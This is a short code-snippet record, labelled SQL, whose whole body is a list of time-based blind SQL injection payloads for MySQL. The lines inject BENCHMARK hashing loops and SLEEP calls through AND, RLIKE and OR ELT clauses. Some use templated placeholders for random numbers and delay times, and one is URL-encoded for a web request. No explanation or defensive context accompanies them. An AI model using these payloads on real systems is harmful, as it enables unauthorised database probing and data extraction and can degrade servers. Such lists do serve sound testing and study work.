---
id: e893a45f-5ab8-451e-88fd-7e3d9077324a
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.670993+00:00'
updated_at: '2023-04-10T20:22:55.551512+00:00'
---

# Code Snippet e893a45f

**Language**: SQL

```sql
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```


